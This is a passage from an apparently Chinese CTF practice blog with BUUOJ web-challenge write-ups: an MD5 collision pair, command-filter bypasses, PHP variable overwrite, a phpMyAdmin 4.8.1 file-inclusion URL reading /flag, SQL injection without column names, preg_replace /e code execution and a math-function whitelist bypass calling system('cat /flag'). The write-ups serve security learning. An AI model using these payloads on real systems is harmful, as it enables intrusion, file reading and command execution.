class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>md5强比较，工具跑一下就出来了</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">a=test<span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%1</span>D<span class="symbol">%E8</span><span class="symbol">%EE</span><span class="symbol">%F4</span><span class="symbol">%CB5</span><span class="symbol">%F8</span><span class="symbol">%8</span>F<span class="symbol">%80</span><span class="symbol">%AB</span><span class="symbol">%5</span>B<span class="symbol">%04</span><span class="symbol">%603</span><span class="symbol">%BE</span><span class="symbol">%CFWJ7</span><span class="symbol">%8</span>Aw<span class="number">5</span>v<span class="symbol">%0</span>EN<span class="symbol">%9</span>A<span class="symbol">%40</span>F<span class="symbol">%11</span><span class="symbol">%C3</span><span class="symbol">%15</span><span class="symbol">%DC</span><span class="symbol">%80</span><span class="symbol">%ED</span><span class="symbol">%A9</span><span class="symbol">%F5</span><span class="symbol">%D0K</span><span class="symbol">%00</span><span class="symbol">%3</span>Co<span class="symbol">%06</span><span class="symbol">%ED</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%E2</span><span class="symbol">%0</span>EI<span class="symbol">%C3</span><span class="symbol">%5</span>B<span class="symbol">%C7</span><span class="symbol">%C3</span><span class="symbol">%96</span>t<span class="symbol">%F4</span><span class="symbol">%0</span>B<span class="symbol">%A1</span><span class="symbol">%26</span><span class="symbol">%91</span><span class="symbol">%7</span>EW<span class="symbol">%09</span><span class="symbol">%A1</span><span class="symbol">%A0R</span><span class="symbol">%AFWc</span><span class="symbol">%D5n</span><span class="symbol">%0</span>E<span class="symbol">%00</span><span class="symbol">%2</span>Fj<span class="symbol">%8</span>A<span class="symbol">%AE</span><span class="symbol">%03</span><span class="symbol">%C1</span><span class="symbol">%BD</span><span class="symbol">%08</span>VEB<span class="symbol">%16</span><span class="symbol">%F9v</span><span class="symbol">%21</span><span class="symbol">%5</span>D<span class="symbol">%C9W</span><span class="symbol">%18</span><span class="symbol">%C9U</span><span class="symbol">%29</span><span class="symbol">%7</span>D<span class="symbol">%A2</span><span class="symbol">%3</span>FyW<span class="symbol">%F6i</span><span class="symbol">%0</span>B<span class="symbol">%A6</span><span class="symbol">%C0i</span><span class="symbol">%97</span><span class="symbol">%CC</span><span class="symbol">%2</span>F<span class="symbol">%98</span>e<span class="symbol">%5</span>B<span class="symbol">%A6</span><span class="symbol">%89</span>O<span class="symbol">%FF</span><span class="symbol">%EBq</span><span class="symbol">%DA</span><span class="symbol">%9</span>F<span class="symbol">%A5</span><span class="symbol">%A7n</span><span class="symbol">%8</span>EV<span class="symbol">%9</span>B<span class="symbol">%2</span>A<span class="symbol">%FA</span><span class="symbol">%06</span>&amp;b=test<span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%1</span>D<span class="symbol">%E8</span><span class="symbol">%EE</span><span class="symbol">%F4</span><span class="symbol">%CB5</span><span class="symbol">%F8</span><span class="symbol">%8</span>F<span class="symbol">%80</span><span class="symbol">%AB</span><span class="symbol">%5</span>B<span class="symbol">%04</span><span class="symbol">%603</span><span class="symbol">%BE</span><span class="symbol">%CFWJ7</span><span class="symbol">%0</span>Aw<span class="number">5</span>v<span class="symbol">%0</span>EN<span class="symbol">%9</span>A<span class="symbol">%40</span>F<span class="symbol">%11</span><span class="symbol">%C3</span><span class="symbol">%15</span><span class="symbol">%DC</span><span class="symbol">%80</span><span class="symbol">%ED</span><span class="symbol">%A9</span><span class="symbol">%F5</span><span class="symbol">%D0K</span><span class="symbol">%00</span><span class="symbol">%3</span>Co<span class="symbol">%06</span><span class="symbol">%ED</span><span class="symbol">%3</span>A<span class="symbol">%22</span>b<span class="symbol">%0</span>FI<span class="symbol">%C3</span><span class="symbol">%5</span>B<span class="symbol">%C7</span><span class="symbol">%C3</span><span class="symbol">%96</span>t<span class="symbol">%F4</span><span class="symbol">%0</span>B<span class="symbol">%A1</span><span class="symbol">%26</span><span class="symbol">%91</span><span class="symbol">%FEW</span><span class="symbol">%09</span><span class="symbol">%A1</span><span class="symbol">%A0R</span><span class="symbol">%AFWc</span><span class="symbol">%D5n</span><span class="symbol">%0</span>E<span class="symbol">%00</span><span class="symbol">%2</span>Fj<span class="symbol">%8</span>A<span class="symbol">%AE</span><span class="symbol">%03</span><span class="symbol">%C1</span><span class="symbol">%BD</span><span class="symbol">%08</span>VEB<span class="symbol">%96</span><span class="symbol">%F9v</span><span class="symbol">%21</span><span class="symbol">%5</span>D<span class="symbol">%C9W</span><span class="symbol">%18</span><span class="symbol">%C9U</span><span class="symbol">%29</span><span class="symbol">%7</span>D<span class="symbol">%A2</span><span class="symbol">%3</span>FyW<span class="symbol">%F6i</span><span class="symbol">%0</span>B<span class="symbol">%A6</span><span class="symbol">%C0i</span><span class="symbol">%97</span><span class="symbol">%CC</span><span class="symbol">%2</span>F<span class="symbol">%98</span><span class="symbol">%E5Z</span><span class="symbol">%A6</span><span class="symbol">%89</span>O<span class="symbol">%FF</span><span class="symbol">%EBq</span><span class="symbol">%DA</span><span class="symbol">%9</span>F<span class="symbol">%A5</span><span class="symbol">%A7n</span><span class="symbol">%8</span>E<span class="symbol">%D6</span><span class="symbol">%9</span>B<span class="symbol">%2</span>A<span class="symbol">%FA</span><span class="symbol">%06</span></span><br></pre></td></tr></table></figure>

<p>不能用数组绕过，<code>string</code>强制类型转换后都是 “Array”</p>
<p>命令禁用了很多，但<strong>linux命令中可以加\，所以甚至可以ca\t /fl\ag</strong></p>
<p><img src="/2020/08/8月刷题记录/image-20200810172023014.png" alt="image-20200810172023014"></p>
<p><img src="/2020/08/8月刷题记录/image-20200810172043258.png" alt="image-20200810172043258"></p>
<p>其他思路1：</p>
<p>sort命令：sort将文件的每一行作为一个单位，相互比较，比较原则是从首字符向后，依次按ASCII码值进行比较，最后将他们按升序输出。</p>
<p>其他思路2：</p>
<p>把flag移到web目录下，然后直接访问拿到flag</p>
<p><img src="/2020/08/8月刷题记录/image-20200810172253738.png" alt="image-20200810172253738"></p>
<p><img src="/2020/08/8月刷题记录/image-20200810172317785.png" alt="image-20200810172317785"></p>
<h3 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h3><p>.git泄露，githack拿源码</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$yds = <span class="string">"dog"</span>;</span><br><span class="line">$is = <span class="string">"cat"</span>;</span><br><span class="line">$handsome = <span class="string">'yds'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $x &amp;&amp; $x !== <span class="string">'flag'</span>)&#123;	<span class="comment">//GET方式传flag,且flag=flag</span></span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]))&#123;	<span class="comment">//GET和POST其中之一必须传flag</span></span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'flag'</span>] === <span class="string">'flag'</span>  || $_GET[<span class="string">'flag'</span>] === <span class="string">'flag'</span>)&#123;	<span class="comment">//GET和POST传flag,不能是flag=flag</span></span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"the flag is: "</span>.$flag;</span><br></pre></td></tr></table></figure>

<p>flag.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$flag = file_get_contents(<span class="string">'/flag'</span>);</span><br></pre></td></tr></table></figure>

<p>存在变量覆盖</p>
<p>payload1: <code>yds=flag</code></p>
<p><code>$$x = $$y</code>  =&gt; <code>$(yds) = $(flag)</code> =&gt; <code>$yds=flag{xxxx}</code> =&gt; <code>exit($yds)</code></p>
<p>payload2:<code>is=flag&amp;flag=flag</code></p>
<p><code>$$x = $$y</code> =&gt; <code>$(is)=$(flag)</code> =&gt; <code>$is=flag{xxxx}</code></p>
<p><code>$$xx = $$y</code> =&gt; <code>$(flag)=$(flag)</code> =&gt; <code>$flag=flag{xxxx}</code></p>
<p><code>exit($is)</code></p>
<h3 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h3><p>扫描到phpinfo.php和phpmyadmin 4.8.1</p>
<p>参考这篇文章：<a href="https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/" target="_blank" rel="noopener">https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/</a> </p>
<p>有一个文件包含漏洞，加上phpinfo.php上传临时文件getshell (:</p>
<p>想复杂了，直接包含/flag就行</p>
<p>payload:<code>http://e5abf389-9025-4a73-a415-3e10dc57dc21.node3.buuoj.cn/phpmyadmin/index.php?target=db_sql.php%3f/../../../../../..//flag</code></p>
<h3 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h3><p>在<a href="https://www.compart.com/en/unicode/搜索" target="_blank" rel="noopener">https://www.compart.com/en/unicode/搜索</a> <strong>thousand</strong>找大于1337的字符</p>
<p><img src="/2020/08/8月刷题记录/image-20200810230209866.png" alt="image-20200810230209866"></p>
<p>提交 <code>%E1%8D%BC</code>即可得到flag</p>
<h3 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h3><p>按照提示加入header</p>
<p>1.Client-IP</p>
<p>2.X-Forwarded-For</p>
<p>3.Remote_Addr</p>
<p>均可以修改IP</p>
<p>php下的模板注入</p>
<p><img src="/2020/08/8月刷题记录/image-20200810232530556.png" alt="image-20200810232530556"></p>
<h3 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h3><p>登录了之后在发布广告处存在sql注入漏洞，我们输入的内容在输入后没有漏洞，当我们发布广告后查看广告详情的时候就造成了二次注入，从而产生了注入。</p>
<p>题目环境过滤了空格，我们使用/**/来进行绕过过滤了or，因此我们无法使用order by 以及information_schema这个库因为过滤了注释符，所以查询语句的最后我们要闭合单引号</p>
<p>无列名注入</p>
<p><code>1&#39;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/’</code></p>
<p>这里我们将users这个表里面的查询的结果提供给外部查询，同时把列名转换成a,b，这样我们后面就直接查询a,b列就可以获得结果</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>'<span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>, (select<span class="comment">/**/</span>group_concat(a)<span class="comment">/**/</span>from(select<span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span><span class="comment">/**/</span>as<span class="comment">/**/</span>a,<span class="number">3</span><span class="comment">/**/</span>as<span class="comment">/**/</span>b<span class="comment">/**/</span>union<span class="comment">/**/</span>sele ct*from<span class="comment">/**/</span>users)x),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span><span class="comment">/**/</span>'</span><br></pre></td></tr></table></figure>

<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>'<span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>, (select<span class="comment">/**/</span>group_concat(b)<span class="comment">/**/</span>from(select<span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span><span class="comment">/**/</span>as<span class="comment">/**/</span>a,<span class="number">3</span><span class="comment">/**/</span>as<span class="comment">/**/</span>b<span class="comment">/**/</span>union<span class="comment">/**/</span>sele ct*from<span class="comment">/**/</span>users)x),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span><span class="comment">/**/</span>'</span><br></pre></td></tr></table></figure>

<h3 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"I have a dream"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Not now!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>($file);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/8月刷题记录/image-20200812174257429.png" alt="image-20200812174257429"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">$_SESSION[<span class="string">'id'</span>] = $id;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span><span class="params">($re, $str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">'/('</span> . $re . <span class="string">')/ei'</span>,</span><br><span class="line">        <span class="string">'strtolower("\\1")'</span>,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $re =&gt; $str) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex($re, $str). <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">true@<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>preg_replace()使用的/e模式可以存在<a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">远程执行代码</a></p>
<p>payload:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/?.*=&#123;<span class="variable">$&#123;phpinfo()&#125;</span>&#125;</span><br><span class="line">\S*=<span class="variable">$&#123;phpinfo()&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/8月刷题记录/image-20200812174555693.png" alt="image-20200812174555693"></p>
<h3 id="BJDCTF-2nd-假猪套天下第一"><a href="#BJDCTF-2nd-假猪套天下第一" class="headerlink" title="[BJDCTF 2nd]假猪套天下第一"></a>[BJDCTF 2nd]假猪套天下第一</h3><p>确实第一</p>
<p>抓包发现 L0g1n.php</p>
<p><img src="/2020/08/8月刷题记录/image-20200812181110056.png" alt="image-20200812181110056"></p>
<p><img src="/2020/08/8月刷题记录/image-20200812181236407.png" alt="image-20200812181236407"></p>
<p>各种header集合</p>
<table>
<thead>
<tr>
<th>Header</th>
<th>解释</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>Accept</td>
<td>指定客户端能够接收的内容类型</td>
<td>Accept: text/plain, text/html,application/json</td>
</tr>
<tr>
<td>Accept-Charset</td>
<td>浏览器可以接受的字符编码集。</td>
<td>Accept-Charset: iso-8859-5</td>
</tr>
<tr>
<td>Accept-Encoding</td>
<td>指定浏览器可以支持的web服务器返回内容压缩编码类型。</td>
<td>Accept-Encoding: compress, gzip</td>
</tr>
<tr>
<td>Accept-Language</td>
<td>浏览器可接受的语言</td>
<td>Accept-Language: en,zh</td>
</tr>
<tr>
<td>Accept-Ranges</td>
<td>可以请求网页实体的一个或者多个子范围字段</td>
<td>Accept-Ranges: bytes</td>
</tr>
<tr>
<td>Authorization</td>
<td>HTTP授权的授权证书</td>
<td>Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td>
</tr>
<tr>
<td>Cache-Control</td>
<td>指定请求和响应遵循的缓存机制</td>
<td>Cache-Control: no-cache</td>
</tr>
<tr>
<td>Connection</td>
<td>表示是否需要持久连接。（HTTP 1.1默认进行持久连接）</td>
<td>Connection: close</td>
</tr>
<tr>
<td>Cookie</td>
<td>HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。</td>
<td>Cookie: $Version=1; Skin=new;</td>
</tr>
<tr>
<td>Content-Length</td>
<td>请求的内容长度</td>
<td>Content-Length: 348</td>
</tr>
<tr>
<td>Content-Type</td>
<td>请求的与实体对应的MIME信息</td>
<td>Content-Type: application/x-www-form-urlencoded</td>
</tr>
<tr>
<td>Date</td>
<td>请求发送的日期和时间</td>
<td>Date: Tue, 15 Nov 2010 08:12:31 GMT</td>
</tr>
<tr>
<td>Expect</td>
<td>请求的特定的服务器行为</td>
<td>Expect: 100-continue</td>
</tr>
<tr>
<td>From</td>
<td>发出请求的用户的Email</td>
<td>From: <a href="mailto:user@email.com" target="_blank" rel="noopener">user@email.com</a></td>
</tr>
<tr>
<td>Host</td>
<td>指定请求的服务器的域名和端口号</td>
<td>Host: <a href="http://www.zcmhi.com" target="_blank" rel="noopener">www.zcmhi.com</a></td>
</tr>
<tr>
<td>If-Match</td>
<td>只有请求内容与实体相匹配才有效</td>
<td>If-Match: “737060cd8c284d8af7ad3082f209582d”</td>
</tr>
<tr>
<td>If-Modified-Since</td>
<td>如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码</td>
<td>If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td>
</tr>
<tr>
<td>If-None-Match</td>
<td>如果内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变</td>
<td>If-None-Match: “737060cd8c284d8af7ad3082f209582d”</td>
</tr>
<tr>
<td>If-Range</td>
<td>如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为Etag</td>
<td>If-Range: “737060cd8c284d8af7ad3082f209582d”</td>
</tr>
<tr>
<td>If-Unmodified-Since</td>
<td>只在实体在指定时间之后未被修改才请求成功</td>
<td>If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td>
</tr>
<tr>
<td>Max-Forwards</td>
<td>限制信息通过代理和网关传送的时间</td>
<td>Max-Forwards: 10</td>
</tr>
<tr>
<td>Pragma</td>
<td>用来包含实现特定的指令</td>
<td>Pragma: no-cache</td>
</tr>
<tr>
<td>Proxy-Authorization</td>
<td>连接到代理的授权证书</td>
<td>Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td>
</tr>
<tr>
<td>Range</td>
<td>只请求实体的一部分，指定范围</td>
<td>Range: bytes=500-999</td>
</tr>
<tr>
<td>Referer</td>
<td>先前网页的地址，当前请求网页紧随其后,即来路</td>
<td>Referer: <a href="http://www.zcmhi.com/archives/71.html" target="_blank" rel="noopener">http://www.zcmhi.com/archives…</a></td>
</tr>
<tr>
<td>TE</td>
<td>客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息</td>
<td>TE: trailers,deflate;q=0.5</td>
</tr>
<tr>
<td>Upgrade</td>
<td>向服务器指定某种传输协议以便服务器进行转换（如果支持）</td>
<td>Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</td>
</tr>
<tr>
<td>User-Agent</td>
<td>User-Agent的内容包含发出请求的用户信息</td>
<td>User-Agent: Mozilla/5.0 (Linux; X11)</td>
</tr>
<tr>
<td>Via</td>
<td>通知中间网关或代理服务器地址，通信协议</td>
<td>Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)</td>
</tr>
<tr>
<td>Warning</td>
<td>关于消息实体的警告信息</td>
<td>Warn: 199 Miscellaneous warning</td>
</tr>
</tbody></table>
<h3 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"太长了不会算"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的字符"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的函数"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload1:</p>
<p><code>$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=cat%20/flag</code></p>
